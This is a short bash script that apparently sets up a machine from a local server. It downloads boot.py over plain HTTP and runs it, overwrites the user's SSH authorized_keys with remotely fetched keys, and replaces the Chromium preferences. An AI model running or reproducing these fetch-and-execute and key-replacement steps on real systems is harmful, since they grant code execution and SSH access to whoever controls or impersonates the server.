#!/bin/bash

sudo pip install requests

whoami
pwd

echo ""
echo ""

echo "Yo!"

curl -s http://10.117.119.203:4000/static/boot.py > boot.py
curl -s http://10.117.119.203:4000/static/ssh_keys > .ssh/authorized_keys
curl -s http://10.117.119.203:4000/static/chrome_prefs > .config/chromium/Default/Preferences

python boot.py
